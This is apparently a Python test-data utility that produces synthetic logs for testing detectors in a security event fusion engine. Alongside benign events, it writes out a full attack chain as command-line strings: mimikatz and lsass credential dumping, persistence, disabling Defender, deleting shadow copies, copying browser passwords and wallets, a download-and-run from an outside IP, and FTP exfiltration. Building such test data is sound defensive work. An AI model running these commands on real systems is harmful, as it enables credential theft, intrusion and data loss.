"""
Synthetic log generator for testing the ADAM Event Fusion Engine.

Produces a single JSON file containing ~1000 log records across several
hosts:

  - Most events are ordinary, benign process/file/network activity
    (chosen to stress-test detectors against false positives).
  - A handful of hosts run a full, multi-stage attack chain (recon ->
    credential access -> privilege escalation -> persistence -> lateral
    movement -> collection -> C2 -> exfiltration -> impact) so every
    detector has real signal to fire on.

This script is a standalone test-data utility - it is not part of the
Event Fusion Engine architecture itself and is not imported by it.

Usage:
    python3 scripts/generate_sample_logs.py [output_path] [--count N]
"""

from __future__ import annotations

import argparse
import json
import random
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List

random.seed(42)

BENIGN_HOSTS = ["WKSTN-042", "WKSTN-107", "WKSTN-233", "SRV-FILE01", "SRV-WEB02"]
ATTACK_HOSTS = ["WKSTN-666", "SRV-DC01"]
USERS = ["j.smith", "a.patel", "m.jones", "svc_backup", "r.chen"]

BENIGN_PROCESSES = [
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
    ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
    ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
    ("teams.exe", "C:\\Users\\AppData\\Local\\Microsoft\\Teams\\Teams.exe"),
    ("excel.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    ("backup_agent.exe", "C:\\Program Files\\Backup\\backup_agent.exe"),
]

BENIGN_COMMANDS = [
    "chrome.exe --profile-directory=Default",
    "outlook.exe /recycle",
    "notepad.exe C:\\Users\\report.txt",
    "excel.exe /r C:\\Users\\budget.xlsx",
    "svchost.exe -k netsvcs",
    "backup_agent.exe --run-scheduled-job",
    "explorer.exe",
    "teams.exe --process-start-args",
]


def _iso(ts: datetime) -> str:
    return ts.isoformat().replace("+00:00", "Z")


def _rand_pid() -> int:
    return random.randint(1000, 65000)


def make_event(
    timestamp: datetime,
    host: str,
    user: str,
    process_name: str,
    command_line: str,
    pid: int,
    ppid: int,
    event_type: str = "process_create",
    **extra: Any,
) -> Dict[str, Any]:
    record = {
        "event_id": str(uuid.uuid4()),
        "timestamp": _iso(timestamp),
        "host": host,
        "user": user,
        "event_type": event_type,
        "pid": pid,
        "ppid": ppid,
        "process_name": process_name,
        "command_line": command_line,
    }
    record.update(extra)
    return record


def generate_benign_events(count: int, start: datetime) -> List[Dict[str, Any]]:
    """Ordinary day-to-day activity across normal workstations/servers."""
    events: List[Dict[str, Any]] = []
    t = start
    for _ in range(count):
        host = random.choice(BENIGN_HOSTS)
        user = random.choice(USERS)
        process_name, image_path = random.choice(BENIGN_PROCESSES)
        command_line = random.choice(BENIGN_COMMANDS)
        t += timedelta(seconds=random.randint(1, 45))
        events.append(
            make_event(
                timestamp=t,
                host=host,
                user=user,
                process_name=process_name,
                command_line=command_line,
                pid=_rand_pid(),
                ppid=_rand_pid(),
                image_path=image_path,
            )
        )
    return events


def generate_attack_chain(host: str, user: str, start: datetime) -> List[Dict[str, Any]]:
    """
    A single, coherent multi-stage attack on one host, in order, so the
    sliding window / process tree / correlator all have realistic
    structure to work with (shared pid/ppid lineage, tight timestamps).
    """
    events: List[Dict[str, Any]] = []
    t = start
    root_pid = _rand_pid()

    def step(minutes: float, **kwargs: Any) -> None:
        nonlocal t
        t = t + timedelta(minutes=minutes)
        events.append(make_event(timestamp=t, host=host, user=user, **kwargs))

    # --- Discovery / Recon (T1082) ---
    step(0.2, process_name="cmd.exe", command_line="whoami /all", pid=root_pid, ppid=1000)
    step(0.3, process_name="cmd.exe", command_line="net user /domain", pid=root_pid, ppid=1000)
    step(0.2, process_name="cmd.exe", command_line="net view", pid=root_pid, ppid=1000)
    step(0.4, process_name="cmd.exe", command_line="arp -a", pid=root_pid, ppid=1000)
    step(0.3, process_name="tasklist.exe", command_line="tasklist", pid=root_pid, ppid=1000)
    step(0.5, process_name="nmap.exe", command_line="nmap -sT -p 1-1024 10.0.0.0/24", pid=root_pid, ppid=1000)

    # --- Credential Access (T1003) ---
    cred_pid = _rand_pid()
    step(1.0, process_name="mimikatz.exe", command_line="mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"", pid=cred_pid, ppid=root_pid)
    step(0.2, process_name="procdump.exe", command_line="procdump.exe -ma lsass.exe lsass_dump.dmp", pid=cred_pid, ppid=root_pid)
    step(0.3, process_name="reg.exe", command_line="reg save hklm\\sam sam.save", pid=cred_pid, ppid=root_pid)

    # --- Privilege Escalation (T1548) ---
    priv_pid = _rand_pid()
    step(0.5, process_name="fodhelper.exe", command_line="fodhelper.exe", pid=priv_pid, ppid=cred_pid)
    step(0.3, process_name="cmd.exe", command_line="sc.exe create backdoorsvc binpath= \"cmd.exe /c whoami\"", pid=priv_pid, ppid=cred_pid)
    step(0.4, process_name="schtasks.exe", command_line="schtasks /create /sc onlogon /ru system /tn updater /tr payload.exe", pid=priv_pid, ppid=cred_pid)

    # --- Persistence (T1547) ---
    step(0.4, process_name="reg.exe", command_line="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d payload.exe", pid=priv_pid, ppid=cred_pid)

    # --- Defense Evasion (T1070) ---
    evasion_pid = _rand_pid()
    step(0.6, process_name="powershell.exe", command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=evasion_pid, ppid=priv_pid)
    step(0.3, process_name="wevtutil.exe", command_line="wevtutil cl Security", pid=evasion_pid, ppid=priv_pid)
    step(0.3, process_name="powershell.exe", command_line="Set-MpPreference -DisableRealtimeMonitoring $true", pid=evasion_pid, ppid=priv_pid)
    step(0.3, process_name="vssadmin.exe", command_line="vssadmin delete shadows /all /quiet", pid=evasion_pid, ppid=priv_pid)

    # --- Lateral Movement (T1021) ---
    lateral_pid = _rand_pid()
    step(1.0, process_name="psexec.exe", command_line="psexec.exe \\\\SRV-DC01 -u admin -p **** cmd.exe", pid=lateral_pid, ppid=evasion_pid, dest_ip="10.0.0.5")
    step(0.4, process_name="powershell.exe", command_line="Invoke-Command -ComputerName SRV-DC01 -ScriptBlock { whoami }", pid=lateral_pid, ppid=evasion_pid, dest_ip="10.0.0.5")
    step(0.3, process_name="net.exe", command_line="net use \\\\SRV-FILE01\\admin$ /user:admin ****", pid=lateral_pid, ppid=evasion_pid, dest_ip="10.0.0.7")

    # --- Collection (T1005) ---
    collect_pid = _rand_pid()
    step(0.5, process_name="powershell.exe", command_line="Copy-Item C:\\Users\\Documents\\* C:\\staging\\", pid=collect_pid, ppid=lateral_pid, target_path="C:\\Users\\Documents\\finance.xlsx")
    step(0.3, process_name="powershell.exe", command_line="Copy-Item C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data C:\\staging\\", pid=collect_pid, ppid=lateral_pid, target_path="Login Data")
    step(0.3, process_name="powershell.exe", command_line="Copy-Item C:\\Users\\AppData\\Roaming\\Exodus C:\\staging\\ -Recurse", pid=collect_pid, ppid=lateral_pid, target_path="wallet.dat")
    step(0.3, process_name="powershell.exe", command_line="Copy-Item C:\\Users\\keepass\\vault.kdbx C:\\staging\\", pid=collect_pid, ppid=lateral_pid, target_path="vault.kdbx")

    # --- Command and Control (T1071) ---
    c2_pid = _rand_pid()
    step(0.6, process_name="powershell.exe", command_line="(New-Object Net.WebClient).DownloadString('http://185.220.101.7/stage2.ps1')", pid=c2_pid, ppid=collect_pid, dest_ip="185.220.101.7", domain="update-service.net")
    step(0.3, process_name="curl.exe", command_line="curl.exe http://185.220.101.7/beacon", pid=c2_pid, ppid=collect_pid, dest_ip="185.220.101.7")

    # --- Exfiltration (T1041) ---
    exfil_pid = _rand_pid()
    step(0.5, process_name="7z.exe", command_line="7z.exe a -pInfected! staging.7z C:\\staging\\*", pid=exfil_pid, ppid=c2_pid)
    step(0.4, process_name="curl.exe", command_line="curl.exe --upload-file staging.7z ftp://185.220.101.7/drop/", pid=exfil_pid, ppid=c2_pid, dest_ip="185.220.101.7")

    # --- Impact (T1486) - includes a burst of rename/delete events for the
    # count-based heuristic in ImpactDetector, plus a ransom note drop. ---
    impact_pid = _rand_pid()
    step(1.0, process_name="encryptor.exe", command_line="encryptor.exe --path C:\\Users --ext .locked", pid=impact_pid, ppid=exfil_pid, target_path="C:\\Users\\Documents\\report.docx.locked")
    for i in range(60):
        t += timedelta(seconds=1)
        events.append(
            make_event(
                timestamp=t,
                host=host,
                user=user,
                process_name="encryptor.exe",
                command_line=f"encryptor.exe --rename file_{i}.docx",
                pid=impact_pid,
                ppid=exfil_pid,
                event_type="file_rename",
                target_path=f"C:\\Users\\Documents\\file_{i}.docx.locked",
            )
        )
    step(0.5, process_name="cmd.exe", command_line="echo drop", pid=impact_pid, ppid=exfil_pid, target_path="C:\\Users\\Documents\\README_TO_DECRYPT.txt")

    return events


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic ADAM test logs.")
    parser.add_argument("output", nargs="?", default="sample_logs.json", help="Output JSON path")
    parser.add_argument("--count", type=int, default=1000, help="Total number of log records")
    args = parser.parse_args()

    start = datetime(2026, 8, 5, 9, 0, 0, tzinfo=timezone.utc)

    attack_events: List[Dict[str, Any]] = []
    for host in ATTACK_HOSTS:
        attack_events.extend(generate_attack_chain(host, "j.smith", start + timedelta(minutes=random.randint(0, 120))))

    benign_needed = max(0, args.count - len(attack_events))
    benign_events = generate_benign_events(benign_needed, start)

    all_events = benign_events + attack_events
    random.shuffle(all_events)  # interleave attack + benign like a real SIEM feed

    output_path = Path(args.output)
    output_path.write_text(json.dumps(all_events, indent=2), encoding="utf-8")
    print(f"Wrote {len(all_events)} events "
          f"({len(benign_events)} benign, {len(attack_events)} attack) to {output_path}")


if __name__ == "__main__":
    main()